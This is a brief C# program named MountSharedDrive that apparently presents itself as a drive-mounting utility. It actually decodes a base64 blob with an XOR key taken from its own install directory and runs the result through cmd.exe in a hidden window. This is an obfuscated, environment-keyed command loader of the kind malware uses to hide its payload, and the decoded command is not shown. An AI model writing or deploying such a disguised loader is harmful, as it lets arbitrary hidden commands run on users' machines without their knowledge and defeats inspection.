using System;
using System.IO;
using System.Security.Cryptography;

class MountSharedDrive
{
	static void Main()
	{
		string x = "a3l8DAwafBQaCFMDOBcXERlBBxBRRUcDBz5qWSkKAkA5BRxDGzQ4ABARUEM8MCQmUwoaOBtbOA8AAHwEHQlKHxcW";
		string k = System.AppDomain.CurrentDomain.BaseDirectory;
		byte[] xc = System.Convert.FromBase64String(x);
		byte[] c = new byte[xc.Length];
		for (int i = 0; i<xc.Length; i++)
			c[i] = (byte)((uint)xc[i] ^ (uint)k[i % k.Length]);

		string command = System.Text.Encoding.UTF8.GetString(c);
		
		System.Diagnostics.Process process = new System.Diagnostics.Process();
		System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
		startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
		startInfo.FileName = "cmd.exe";
		startInfo.Arguments = command;
		process.StartInfo = startInfo;
		process.Start();
    }
}